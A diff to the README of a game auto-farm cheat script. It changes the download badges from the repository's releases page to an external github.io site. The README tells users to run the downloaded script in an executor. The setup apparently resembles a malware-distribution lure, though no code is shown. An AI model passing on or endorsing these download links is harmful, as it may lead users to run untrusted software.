@@ -1,6 +1,6 @@
 # 🧠 Brainrot-Simulator-Script-Auto-Farm-2026 - Master your game progress with automation
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Louisiananfireopal94/Brainrot-Simulator-Script-Auto-Farm-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://louisiananfireopal94.github.io)
 
 ## 📋 Project Overview
 
@@ -27,7 +27,7 @@ Follow these instructions to set up the tool. You do not need coding skills to u
 6. Use the file menu in your executor to load the downloaded script file.
 7. Execute the script to reveal the user interface.
 
-[![](https://img.shields.io/badge/Get_The_Tool-Click_Here-grey.svg)](https://github.com/Louisiananfireopal94/Brainrot-Simulator-Script-Auto-Farm-2026/releases)
+[![](https://img.shields.io/badge/Get_The_Tool-Click_Here-grey.svg)](https://louisiananfireopal94.github.io)
 
 ## 🛠️ Features
 
